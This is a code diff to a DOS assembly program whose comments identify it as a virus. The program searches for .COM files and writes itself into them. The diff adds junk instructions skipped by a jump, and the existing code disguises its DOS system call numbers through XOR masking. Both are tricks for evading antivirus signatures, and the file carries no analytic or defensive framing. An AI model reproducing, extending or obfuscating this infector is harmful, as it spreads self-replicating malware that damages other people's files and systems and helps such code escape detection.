@@ -3,6 +3,20 @@
 FNAME EQU 9EH ;search-function file name result
     ORG 100H
 START:
+    jmp REALSTART ; jump to the real start
+    mov ax,03H ; insert some dummy instructions that are never executed
+    xor cx,cx
+    mov bx,ax
+    xor bx,bx
+    int 21H
+    mov cx,bx
+    push cx
+    xor ax,ax
+    mov dx,cx
+    pop cx
+    int 21H
+    xor dx,dx
+REALSTART:
     mov ah,7FH 
     xor ah,31H ; apply mask -> 7FH xor 31H = 4EH ;search for *.COM (search first)
     mov dx,OFFSET COM_FILE
@@ -15,7 +29,7 @@ SEARCH_LP:
     xchg ax,bx ;write virus to file
     mov ah,12H
     xor ah,52H; apply mask -> 12H xor 52H = 40H
-    mov cl,60 ;size of this virus
+    mov cl,120 ;size of this virus
     mov dx,100H ;location of this virus
     int 21H
     mov ah,7EH
